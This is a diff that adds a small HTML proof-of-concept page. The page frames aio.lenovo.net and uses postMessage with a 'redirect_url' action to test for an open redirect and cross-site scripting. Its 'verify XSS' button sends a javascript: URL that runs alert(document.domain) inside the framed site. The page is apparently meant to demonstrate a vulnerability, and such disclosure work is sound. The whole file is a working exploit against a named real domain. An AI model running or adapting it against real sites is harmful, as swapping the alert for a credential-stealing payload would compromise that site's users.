@@ -1,0 +1,13 @@
+<!doctype html>
+<meta charset="utf-8">
+<button onclick="go('https://example.com/')">验证跳转</button>
+<button onclick="go('javascript:alert(\"XSS:\"+document.domain)')">验证XSS</button>
+<iframe id="v" src="https://aio.lenovo.net/" style="width:100%;height:700px"></iframe>
+<script>
+function go(u){
+  document.getElementById('v').contentWindow.postMessage(
+    {action:'redirect_url', url:u},
+    'https://aio.lenovo.net'
+  );
+}
+</script>
